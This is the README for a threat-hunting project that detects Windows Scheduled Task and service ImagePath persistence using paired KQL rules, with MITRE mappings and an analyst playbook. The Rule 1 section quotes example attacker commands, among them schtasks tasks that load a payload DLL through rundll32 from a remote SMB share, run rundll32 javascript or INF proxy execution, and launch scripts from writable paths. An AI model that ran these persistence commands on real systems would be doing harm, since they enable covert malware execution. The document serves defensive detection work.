# Scheduled Task Persistence Ecosystem (Rundll32-Aware + Silent TaskCache Cousins)

This folder contains a **cousin-based persistence ecosystem** for detecting attacker abuse of **Scheduled Tasks** in Windows environments.

Rather than building one monolithic “persistence mega-rule”, this ecosystem splits detection into two **paired composite sensors**:

- **Process Truth (CLI Task Creation)**
- **Registry Truth (Silent TaskCache Persistence)**

Together, these rules provide full coverage of how modern attackers establish task-based persistence.

---

## Why This Ecosystem Exists

Scheduled Tasks are one of the most abused persistence mechanisms because they allow:

- execution at logon/startup
- SYSTEM-level persistence
- stealth via legitimate Windows tooling
- indirect execution via LOLBins like `rundll32.exe`

Attackers register tasks in **two primary ways**:

| Method | Example | Visibility |
|-------|---------|------------|
| **CLI Creation** | `schtasks.exe /create` | Process telemetry |
| **Silent API/COM Registration** | TaskCache registry writes | Registry telemetry |

Most SOCs only detect the first.

This ecosystem detects **both**.

---

# Rule 1 — Scheduled Task Abuse (Creation/Modification) — RUNDLL-AWARE

## File

`Scheduled_Tasks_Rundll_Integration.kql`

## Minimum Truth Anchor

A scheduled task is created or modified via:

- `schtasks.exe /create`
- `schtasks.exe /change`

This is the baseline truth that task persistence is being attempted.

---

## Reinforcement (Attacker Tradecraft Inside `/tr`)

This rule becomes high-fidelity when the task action contains dangerous primitives such as:

### Rundll32 Script/Protocol Handler Abuse

```cmd
schtasks /create /tn Maintain /tr "rundll32 javascript:...RunHTMLApplication..."
```
Attacker intent:
Execute script payloads through rundll32 without dropping an EXE.
MITRE:
T1053.005 Scheduled Task
T1218.011 Rundll32
T1059 Script Execution
Rundll32 Remote DLL Load (UNC/WebDAV)
Copy code
Cmd
schtasks /create /tn Loader /tr "rundll32 \\10.10.10.5\share\payload.dll,Start"
Attacker intent:
Load malware remotely over SMB/WebDAV to reduce disk artifacts.
MITRE:
T1218.011
T1021.002 SMB Lateral Movement
T1105 Ingress Tool Transfer
Rundll32 INF Proxy Execution
Copy code
Cmd
schtasks /change /tn Persist /tr "rundll32 advpack.dll,LaunchINFSection evil.inf"
Attacker intent:
Execute persistence payloads through signed Windows setup mechanisms.
MITRE:
T1218 Signed Binary Proxy Execution
T1547.001 Persistence via Indirect Execution
Script Engines from Writable Paths
Copy code
Cmd
schtasks /create /tn Update /tr "wscript C:\Users\Public\update.vbs"
Attacker intent:
Persist via user-writable staging locations.
MITRE:
T1059.005 VBScript
T1036 Masquerading
XML Task Import Abuse
Copy code
Cmd
schtasks /create /xml C:\Windows\Temp\task.xml /tn Backdoor
Attacker intent:
Hide task actions inside XML definitions.
MITRE:
T1053.005
T1027 Obfuscated Files or Information
Output (SOC Ready)
This rule extracts:
TaskName (/tn)
TaskRun (/tr)
RunAs (/ru)
Schedule (/sc)
Tradecraft Category (Rundll Remote, INF Proxy, Script Engine, etc.)
And produces a HunterDirective field with analyst pivots.
Rule 2 — Registry Persistence via TaskCache + Service ImagePath
File
Registry_Persistence_Background_Service_TaskCache_v2.kql
Minimum Truth Anchor
A registry persistence write occurs in one of these surfaces:
TaskCache registry keys (silent scheduled task persistence)
Service ImagePath persistence (HKLM\SYSTEM\Services\...\ImagePath)
This catches persistence that never touches schtasks.exe.
Silent TaskCache Persistence (Modern Tradecraft)
Attackers register tasks via COM/API:
PowerShell ScheduledTask cmdlets
WMI task registration
Malware direct registry manipulation
The task materializes here:
Copy code
Text
HKLM\...\Schedule\TaskCache\Tasks\{GUID}
HKLM\...\Schedule\TaskCache\Tree\<TaskName>
Attacker intent:
Persist without spawning schtasks.exe.
MITRE:
T1053.005 Scheduled Task
T1112 Modify Registry
Service ImagePath Persistence
Copy code
Reg
HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc\ImagePath =
C:\Users\Public\evil.exe
Attacker intent:
Establish service persistence pointing to attacker-controlled binaries.
MITRE:
T1543.003 Windows Service
Reinforcement Signals
This rule scores higher when registry values contain:
Base64 payload blobs
LOLBin primitives (powershell, mshta, rundll32)
URLs/IPs inside persistence values
User-writable execution targets
Rare/untrusted writer process
Cousin-Based Ecosystem Model
These two rules are cousins:
Cousin Rule
Truth Anchor
What It Detects
ScheduledTask_RundllAware
schtasks.exe execution
CLI task creation + dangerous /tr actions
Registry_TaskCache_Persistence
TaskCache registry writes
Silent COM/API task persistence
Service_ImagePath_Persistence
Services registry writes
Service persistence via ImagePath
They share attacker intent, but operate in different telemetry domains.
Operational Guidance
Best Practice Deployment
Run both rules continuously as Tier-1 persistence sensors.
Correlate outside the rules:
CousinConfirm Logic:
If TaskCache persistence occurs
AND schtasks creation occurs within 24h
→ Persistence capability confirmed.
AttackStoryChain Logic:
If persistence + execution + ingress truths converge
→ Create incident.
Analyst Pivot Playbook
When these fire:
Extract the referenced task action (/tr)
Pull task XML definition if present
Inspect referenced binary/script path
Scope for same task name/GUID fleet-wide
Correlate with:
LOLBin execution hunts
File staging (Temp/Public)
Lateral movement activity
Summary
This ecosystem provides production-grade coverage for:
Scheduled Task persistence via CLI
Rundll32 task action abuse
Silent persistence via TaskCache registry truth
Service ImagePath persistence cousins
Minimum Truth defines the sensor.
Reinforcement defines confidence.
Cousins define ecosystem coverage.
Author: Ala Dabat
Composite Threat Hunting Framework — Production Ready Persistence Ecosystems

